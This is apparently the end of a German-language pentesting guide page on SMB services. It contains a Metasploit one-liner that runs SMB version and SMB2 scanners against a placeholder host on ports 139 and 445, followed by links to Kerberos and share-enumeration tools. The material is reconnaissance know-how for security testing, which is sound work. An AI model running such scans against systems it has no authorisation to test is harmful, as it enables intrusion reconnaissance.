Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
## Referenzen

- [NetExec (CME) wiki – Kerberos-Nutzung](https://www.netexec.wiki/)
- [Pentesting Kerberos (88) – Client-Einrichtung und Fehlerbehebung](../pentesting-kerberos-88/README.md)
- [ShareHound (Sammler)](https://github.com/p0dalirius/sharehound)
- [ShareQL (DSL)](https://github.com/p0dalirius/shareql)

{{#include ../../banners/hacktricks-training.md}}
